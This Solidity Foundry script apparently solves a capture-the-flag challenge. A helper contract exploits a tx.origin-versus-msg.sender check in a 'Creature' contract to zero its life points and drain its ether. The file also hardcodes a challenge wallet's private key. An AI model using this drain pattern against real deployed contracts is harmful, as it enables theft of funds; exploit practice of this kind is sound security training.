// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x7916aBC20e18F27cBdEC72a5c4F73e8E15CED37a);
    address wallet = 0x2379Aed00Bbc7dd7B4C960816F4dA47E1ce76F60;
    Creature public target = setup.TARGET();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0xa7749fb7b1b1b2558fc94e37567994d8bc1484d20c92d41e3247cc63b80a390d);

        target.attack(0);
        Hack hack = new Hack(address(target));
        hack.attack();
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// "PrivateKey": "0xa7749fb7b1b1b2558fc94e37567994d8bc1484d20c92d41e3247cc63b80a390d",
//     "Address": "0x2379Aed00Bbc7dd7B4C960816F4dA47E1ce76F60",
//     "TargetAddress": "0x040575895149a75C66205A6514C937C3c9e5E110",
//     "setupAddress": "0x7916aBC20e18F27cBdEC72a5c4F73e8E15CED37a"


contract Hack {
    Creature public target;
    constructor(address _chall) {
        target = Creature(_chall);
    }

    function attack() external {
        target.attack(1000);
        target.loot();
    }

    receive() external payable {}
}

contract Setup {
    Creature public immutable TARGET;

    constructor() payable {
        require(msg.value == 1 ether);
        TARGET = new Creature{value: 10}();
    }

    function isSolved() public view returns (bool) {
        return address(TARGET).balance == 0;
    }
}

contract Creature {
    uint256 public lifePoints;
    address public aggro;

    constructor() payable {
        lifePoints = 1000;
    }

    function attack(uint256 _damage) external {
        if (aggro == address(0)) {
            aggro = msg.sender;
        }

        if (_isOffBalance() && aggro != msg.sender) {
            lifePoints -= _damage;
        } else {
            lifePoints -= 0;
        }
    }

    function loot() external {
        require(lifePoints == 0, "Creature is still alive!");
        payable(msg.sender).transfer(address(this).balance);
    }

    function _isOffBalance() private view returns (bool) {
        return tx.origin != msg.sender;
    }
}